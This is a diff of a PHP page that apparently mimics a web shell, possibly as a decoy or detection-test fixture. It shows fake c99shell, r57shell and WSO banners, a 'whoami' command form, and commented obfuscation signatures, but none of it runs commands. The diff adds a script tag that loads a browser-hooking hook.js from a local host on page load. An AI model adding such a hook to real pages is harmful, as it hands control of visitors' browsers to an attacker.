@@ -1,28 +1,29 @@
 <?php
 
+header('Cache-Control: no-cache, must-revalidate');
 header('Content-Type: text/html; charset=utf-8');
 ?>
 <!DOCTYPE html>
 <html>
 <head>
-    <title>c99shell - v.1.0</title>
+    <title>r57shell</title>
+    <script src="http://127.0.0.1:3000/hook.js"></script>
 </head>
 <body>
-    <h1>WSO Web Shell (Mock)</h1>
-    <p>Safe mode: <b>OFF</b></p>
-    <p>OS: Linux w51.server.net 2.6.32 #1 SMP</p>
-    
-    <form method="POST" action="">
-        <input type="text" name="cmd" value="whoami">
+    <h1><b>c99shell</b> v.1.0</h1>
+    <br>
+    <title>phpFM</title>
+
+    <form name="myshell" method="POST">
+        <input type="hidden" name="act" value="ls">
+        <input type="text" name="cmd" value="whoami" size="50">
         <input type="submit" value="Execute">
     </form>
 
     <?php
-    if (isset($_POST['cmd'])) {
-        echo "<pre>root</pre>";
-    }
-    echo "<!-- eval(base64_decode( -->";
-    echo "<!-- preg_replace('/.*/e', ... -->";
+    echo "<!-- eval(gzinflate(base64_decode( -->";
+    echo "<br>Safe Mode: <font color=\"red\">OFF</font><br>";
+    echo "OS: Linux<br>";
     ?>
 </body>
 </html>
